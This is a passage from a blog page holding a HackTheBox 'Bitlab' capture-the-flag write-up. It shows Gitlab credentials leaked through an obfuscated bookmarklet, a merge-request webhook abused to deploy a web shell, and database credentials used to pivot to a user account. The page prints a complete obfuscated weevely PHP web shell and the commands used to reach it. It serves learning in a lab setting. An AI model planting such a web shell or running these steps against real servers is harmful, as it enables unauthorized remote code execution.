@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during multiple pentests) while the root part was my first time Reverse Engineering. Tl;Dr: T">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Bitlab">
+<meta property="og:url" content="https://hg8.sh/bitlab/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during multiple pentests) while the root part was my first time Reverse Engineering. Tl;Dr: T">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82153801-02412300-986a-11ea-819e-b4337e7d8310.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/67625187-25eb4000-f82a-11e9-81e9-2541d037031e.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/67625306-f6d5ce00-f82b-11e9-84b8-7a47c3ba733b.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/67625567-7913c180-f82f-11e9-9a78-54c020336a58.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/80528522-5907bb00-8996-11ea-9857-427940c42f1a.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/80528813-d0d5e580-8996-11ea-80e5-8f100149aaec.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/80529378-ae909780-8997-11ea-9b67-1d56644cfa18.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/80529782-42fafa00-8998-11ea-8bcc-5e13388f7ae5.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/80529850-69b93080-8998-11ea-888c-cdb5253103bd.png">
+<meta property="article:published_time" content="2020-01-10T23:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-18T10:08:38.801Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="bitlab">
+<meta property="article:tag" content="obfuscation">
+<meta property="article:tag" content="webshell">
+<meta property="article:tag" content="git">
+<meta property="article:tag" content="gitlab">
+<meta property="article:tag" content="git hook">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82153801-02412300-986a-11ea-819e-b4337e7d8310.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+     
+    <title>HackTheBox - Bitlab :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/postman/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/craft/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/bitlab/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/bitlab/&text=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/bitlab/&title=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/bitlab/&is_video=false&description=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Bitlab&body=Check out this article: https://hg8.sh/bitlab/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/bitlab/&title=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/bitlab/&title=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/bitlab/&title=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/bitlab/&title=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/bitlab/&name=HackTheBox - Bitlab&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/bitlab/&t=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag.</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-shell-as-www-data"><span class="toc-number">1.2.</span> <span class="toc-text">Web-shell as www-data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-clave-user"><span class="toc-number">1.3.</span> <span class="toc-text">Pivot www-data -&gt; clave user</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-engineering-of-RemoteConnection-exe"><span class="toc-number">2.2.</span> <span class="toc-text">Reverse engineering of RemoteConnection.exe</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Strings"><span class="toc-number">2.2.1.</span> <span class="toc-text">Strings</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Debugging"><span class="toc-number">2.2.2.</span> <span class="toc-text">Debugging</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Breaking"><span class="toc-number">2.2.3.</span> <span class="toc-text">Breaking</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#“Unintended”-way-to-root"><span class="toc-number">3.</span> <span class="toc-text">“Unintended” way to root</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.png);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+       
+        <li><a href="/tags/">Tags</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - Bitlab
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2020-01-10T23:00:00.000Z" itemprop="datePublished">11-01-2020</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      11 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="587" alt="bitlab-hackthebox" src="https://user-images.githubusercontent.com/9076747/82153801-02412300-986a-11ea-819e-b4337e7d8310.png">
+
+<p>Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during multiple pentests) while the root part was my first time Reverse Engineering.</p>
+<p><strong>Tl;Dr:</strong> The user part needed you access a Gitlab instance by using credentials leaked by one of the developer. From here you could merge a web-shell that is automatically pulled on the server by a <code>merge_request</code> webhook. Still from the Gitlab instance you find a piece of code with database credentials. With the web-shell as <code>www-data</code> you can pivot to <code>clave</code> user using his password found in the database and get the flag.<br>The root part was reverse engineering of an Windows binary to extract the <code>root</code> account password needed to grab the flag.</p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<p>First we add the box ip to our host file and let’s start!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.114 bitlab.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag."></a>User flag.</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC bitlab.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-26 02:00 CEST</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx</span><br><span class="line">|_ http-robots.txt: 55 disallowed entries (15 shown)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 96.45 seconds</span><br></pre></td></tr></table></figure>
+
+<p>We have a classical web app running on port 443 and the ssh port 22 open.</p>
+<p>Opening <code>http://bitlab.htb</code> display the following a gitlab instance :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/67625187-25eb4000-f82a-11e9-81e9-2541d037031e.png" alt="bitlab homepage"></p>
+<p>Using <code>gobuster</code> to brute force for interesting directories and files won’t be useful here since all urls return a redirect to the login page. We will do the old fashioned way of manual browsing. I will be quick since there is only three links accessible from the main page:</p>
+<ul>
+<li><code>Explore</code> page is empty.</li>
+<li><code>Help</code> show a directory listing for documentation. </li>
+<li><code>bookmarks.html</code> page display what looks like the exported browser bookmarks of the developer.</li>
+</ul>
+<p>The <code>Gitlab - Sign In</code> bookmark looks usual:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DT</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">HREF</span>=<span class="string">"javascript:(function()&#123; var _0x4b18=["</span>\<span class="attr">x76</span>\<span class="attr">x61</span>\<span class="attr">x6C</span>\<span class="attr">x75</span>\<span class="attr">x65</span>","\<span class="attr">x75</span>\<span class="attr">x73</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x5F</span>\<span class="attr">x6C</span>\<span class="attr">x6F</span>\<span class="attr">x67</span>\<span class="attr">x69</span>\<span class="attr">x6E</span>","\<span class="attr">x67</span>\<span class="attr">x65</span>\<span class="attr">x74</span>\<span class="attr">x45</span>\<span class="attr">x6C</span>\<span class="attr">x65</span>\<span class="attr">x6D</span>\<span class="attr">x65</span>\<span class="attr">x6E</span>\<span class="attr">x74</span>\<span class="attr">x42</span>\<span class="attr">x79</span>\<span class="attr">x49</span>\<span class="attr">x64</span>","\<span class="attr">x63</span>\<span class="attr">x6C</span>\<span class="attr">x61</span>\<span class="attr">x76</span>\<span class="attr">x65</span>","\<span class="attr">x75</span>\<span class="attr">x73</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x5F</span>\<span class="attr">x70</span>\<span class="attr">x61</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x77</span>\<span class="attr">x6F</span>\<span class="attr">x72</span>\<span class="attr">x64</span>","\<span class="attr">x31</span>\<span class="attr">x31</span>\<span class="attr">x64</span>\<span class="attr">x65</span>\<span class="attr">x73</span>\<span class="attr">x30</span>\<span class="attr">x30</span>\<span class="attr">x38</span>\<span class="attr">x31</span>\<span class="attr">x78</span>"];<span class="attr">document</span>[<span class="attr">_0x4b18</span>[<span class="attr">2</span>]](<span class="attr">_0x4b18</span>[<span class="attr">1</span>])[<span class="attr">_0x4b18</span>[<span class="attr">0</span>]]= <span class="string">_0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]</span>= <span class="string">_0x4b18[5];</span> &#125;)()" <span class="attr">ADD_DATE</span>=<span class="string">"1554932142"</span>&gt;</span>Gitlab Login<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>The bookmark is not a classic url but javascript script. This is a useful trick that allow you to run javascript on a given website just by clicking on the bookmark icon.</p>
+<p>Since the js is obfuscated a little let’s open the Gitlab login page and run it onto the console to see what happen :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/67625306-f6d5ce00-f82b-11e9-84b8-7a47c3ba733b.png" alt="bitlab bookmark script"></p>
+<p>The js script is automatically filling the login form with username <code>clave</code> and a password. While checking network we can see that the password is <code>11des0081x</code>.</p>
+<p>So we have access to one developer Gitlab account. Out of curiosity I tried to SSH with those credentials but without surprise, it didn’t worked. Let’s move on.</p>
+<p>We have access to two repositories :</p>
+<ul>
+<li>Deployer</li>
+<li>Profile</li>
+</ul>
+<p>Seeing by the name we can guess that <code>deployer</code> will be a kind of script to automatically deploy application to the web server. Let’s try to understand the inner working better:</p>
+<p><code>deployer</code> repository hold a single <code>index.php</code> file. The README file explain that it’s a webhook. Reading through the <a href="https://docs.gitlab.com/ee/user/project/integrations/webhooks.html" target="_blank" rel="noopener">documentation of gitlab</a> we can understand that a webhook is a function that will call a given url when a event occur on the repository:</p>
+<blockquote>
+<p>Project webhooks allow you to trigger a URL if for example new code is pushed or a new issue is created. You can configure webhooks to listen for specific events like pushes, issues or merge requests. GitLab will send a POST request with data to the webhook URL.</p>
+</blockquote>
+<p>In our case here, we can guess that the repository is configured to make a call to <code>http://bitlab.htb/deployer/index.php</code> when a action is made on the repository (can be commit, merge, pull request, etc…).  </p>
+<p>Let’s take a look at the <code>index.php</code> to understand what action is made once it’s called :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$input = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">$payload  = json_decode($input);</span><br><span class="line"></span><br><span class="line">$repo = $payload-&gt;project-&gt;name ?? <span class="string">''</span>;</span><br><span class="line">$event = $payload-&gt;event_type ?? <span class="string">''</span>;</span><br><span class="line">$state = $payload-&gt;object_attributes-&gt;state ?? <span class="string">''</span>;</span><br><span class="line">$branch = $payload-&gt;object_attributes-&gt;target_branch ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($repo==<span class="string">'Profile'</span> &amp;&amp; $branch==<span class="string">'master'</span> &amp;&amp; $event==<span class="string">'merge_request'</span> &amp;&amp; $state==<span class="string">'merged'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> shell_exec(<span class="string">'cd ../profile/; sudo git pull'</span>),<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"OK\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>This a rather simple script. Judging from the <code>if</code> condition we understand that the script will change directory to <code>../profile/</code> and then make a <code>git pull</code> to get the latest changes on every merged merge request.   </p>
+<p>It’s our luck, because we have control over the <code>profile</code> repository which is available through the Gitlab instance. That means that if we merge a file though a <code>merge_request</code> to the <code>profile</code> repository, the said file will automatically be pulled on the server by the <code>deployer/index.php</code> webhook. That’s the perfect scenario for a web-shell don’t you think? :)</p>
+<h3 id="Web-shell-as-www-data"><a href="#Web-shell-as-www-data" class="headerlink" title="Web-shell as www-data"></a>Web-shell as www-data</h3><p>Through this Gitlab interface we can add a new file to the <code>profile</code> repository, it will be faster than cloning. </p>
+<p>I used <a href="https://github.com/epinna/weevely3" target="_blank" rel="noopener"><code>weevely</code></a> to generate a php web-shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python weevely.py generate xxxxxxxx hg8.php</span><br><span class="line">Generated <span class="string">'hg8.php'</span> with password <span class="string">'xxxxxxxx'</span> of 762 byte size.</span><br><span class="line">[hg8@archbook ~]$ cat hg8.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$r</span>=<span class="string">'$k="ab+-c7+-377b";$kh=+-"3b+-25356491d+-a";$+-kf="+-be0+-0e7cb757+-b";$p=+-"w0NSnMM+-i'</span>;</span><br><span class="line"><span class="variable">$A</span>=<span class="string">'+-j&#125;;&#125;&#125;r+-e+-tur+-n $o;&#125;if(+-@preg_+-+-matc+-h("/$kh(+-.+)+-$kf/",@file_get_+-conten'</span>;</span><br><span class="line"><span class="variable">$Y</span>=<span class="string">';$r+-=@ba+-se64_+-+-encod+-e(@x(@gzcompre+-ss(+-$o),$+-k));print("$p+-+-$kh$r$kf");&#125;'</span>;</span><br><span class="line"><span class="variable">$G</span>=<span class="string">'or($i=0;$i+-&lt;$l+-;+-)&#123;fo+-r($+-j+-=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++-+-+,$+-i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$'</span>;</span><br><span class="line"><span class="variable">$D</span>=<span class="string">'ba+-s+-e+-64_decode($m[1+-])+-,$k+-)));$o=@ob_get_c+-+-onte+-nts();@ob_en+-d_clean()'</span>;</span><br><span class="line"><span class="variable">$l</span>=<span class="string">'ONjCY+-uBR";funct+-ion x+-($t,$k+-)&#123;$c+-=+-strle+-+-n($k);$l=st+-rlen(+-$t);$o="+-";f'</span>;</span><br><span class="line"><span class="variable">$n</span>=str_replace(<span class="string">'A'</span>,<span class="string">''</span>,<span class="string">'AcAreAate_AfuncAtiAon'</span>);</span><br><span class="line"><span class="variable">$w</span>=<span class="string">'ts(+-"php:/+-/+-input"),$+-m)==1)&#123;+-@ob_s+-tart()+-;+-@eva+-l(@gzu+-ncompress(@x+-(@'</span>;</span><br><span class="line"><span class="variable">$W</span>=str_replace(<span class="string">'+-'</span>,<span class="string">''</span>,<span class="variable">$r</span>.<span class="variable">$l</span>.<span class="variable">$G</span>.<span class="variable">$A</span>.<span class="variable">$w</span>.<span class="variable">$D</span>.<span class="variable">$Y</span>);</span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$n</span>(<span class="string">''</span>,<span class="variable">$W</span>);<span class="variable">$u</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>After committing our new file to the repository we start a merge request and merge it ourselves since we have enough permissions to do so. </p>
+<p>Our web-shell is now in the <code>profile</code> repository:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/67625567-7913c180-f82f-11e9-9a78-54c020336a58.png" alt="profile repository webshell"></p>
+<p>If the web-hook worked properly our web shell file should already be on the server, let’s try it out :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python weevely.py http://bitlab.htb/profile/hg8.php htbpassword</span><br><span class="line"></span><br><span class="line">weevely&gt; id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@bitlab:/var/www/html/profile $</span><br></pre></td></tr></table></figure>
+
+<p>We are in as user <code>www-data</code>. </p>
+<h3 id="Pivot-www-data-gt-clave-user"><a href="#Pivot-www-data-gt-clave-user" class="headerlink" title="Pivot www-data -&gt; clave user"></a>Pivot www-data -&gt; clave user</h3><p>Let’s do some recon to get the user flag :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/ $ ls /home</span><br><span class="line">clave</span><br><span class="line">www-data@bitlab:/ $ ls -l /home/clave</span><br><span class="line">-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe</span><br><span class="line">-r-------- 1 clave clave    33 Feb 28  2019 user.txt</span><br></pre></td></tr></table></figure>
+
+<p>The user is <code>clave</code> as well. </p>
+<p>After a bit of recon, it seems that nothing helpful seems to be accessible from <code>www-data</code> user. When nothing can be found, a good strategy is to go back at the beginning to make sure we didn’t forgot anything. Let’s go back to our starting point : Gitlab.</p>
+<p>After searching around and digging a bit more we can find a “Snippet” page under each users profile. On the Developer profile there is a <code>Postgresql</code> snippet with hard-coded credentials:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$db_connection = pg_connect(<span class="string">"host=localhost dbname=profiles user=profiles password=profiles"</span>);</span><br><span class="line">$result = pg_query($db_connection, <span class="string">"SELECT * FROM profiles"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Let’s try to dig into the database for useful informations:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/ $ psql profiles profiles</span><br><span class="line">sh: 1: psql: not found</span><br></pre></td></tr></table></figure>
+
+<p>Since <code>psql</code> is not installed, let’s use the postgresql PHP library. I tweaked the snippet a little to obtain the following scrip :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$db_connection = pg_connect(<span class="string">"host=localhost dbname=profiles user=profiles password=profiles"</span>);</span><br><span class="line"></span><br><span class="line">$query_result = pg_query($db_connection, <span class="string">"SELECT * FROM profiles"</span>);</span><br><span class="line">$results = pg_fetch_all($query_result);</span><br><span class="line">print_r($results);</span><br></pre></td></tr></table></figure>
+
+<p>Running the php script output only one user, <code>clave</code> again and what looks like a <code>base64</code> encoded password:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/tmp $ php test.php</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; 1</span><br><span class="line">            [username] =&gt; clave</span><br><span class="line">            [password] =&gt; c3NoLXN0cjBuZy1wQHNz==</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>Decoding the password gives the following:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"c3NoLXN0cjBuZy1wQHNz=="</span> | base64 -di</span><br><span class="line">ssh-str0ng-p@ss</span><br></pre></td></tr></table></figure>
+
+<p>Awesome, we got the ssh password for user <code>clave</code> let’s go for the user flag:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh clave@bitlab.htb</span><br><span class="line">clave@bitlab.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure>
+
+<p><code>Permission denied</code> that’s disappointing and strange. The database entry clearly state the user is <code>clave</code> (we saw previously that no other user are present on the box). The password itself state ssh… Could it be that it was simply the clear-text password…?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh clave@bitlab.htb</span><br><span class="line">clave@bitlab.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Last login: Sun Oct 27 14:26:51 2019 from 10.10.10.10</span></span><br><span class="line"><span class="string">clave@bitlab:~$ cat user.txt</span></span><br><span class="line"><span class="string">1e3fxxxxxxxxxxxxxxxxb8154</span></span><br></pre></td></tr></table></figure>
+
+<p>That was it, it was easy to loose time on this one but the password was <code>c3NoLXN0cjBuZy1wQHNz==</code> without decoding.</p>
+<p>Time to move to root.</p>
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The recon part was quite quick, a Windows executable named <code>RemoteConnection.exe</code> was present on the home folder. </p>
+<p>Got a little surprised seeing this in a Linux box but why not after all. It was my first time reverse engineering so it took me a bit of time to gather the right tools and understand how this binary was working.</p>
+<p>Let’s pull it and start the analysis:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp clave@bitlab.htb:~/RemoteConnection.exe .</span><br><span class="line">clave@bitlab.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">RemoteConnection.exe               100%   14KB 279.5KB/s   00:00</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Reverse-engineering-of-RemoteConnection-exe"><a href="#Reverse-engineering-of-RemoteConnection-exe" class="headerlink" title="Reverse engineering of RemoteConnection.exe"></a>Reverse engineering of RemoteConnection.exe</h3><p>Oddly enough I was able to make it work on <em>any</em> of my virtual machines. Tried Windows 7, 10, x32, x64 everything. </p>
+<p>Every time I got the following error message:</p>
+<blockquote>
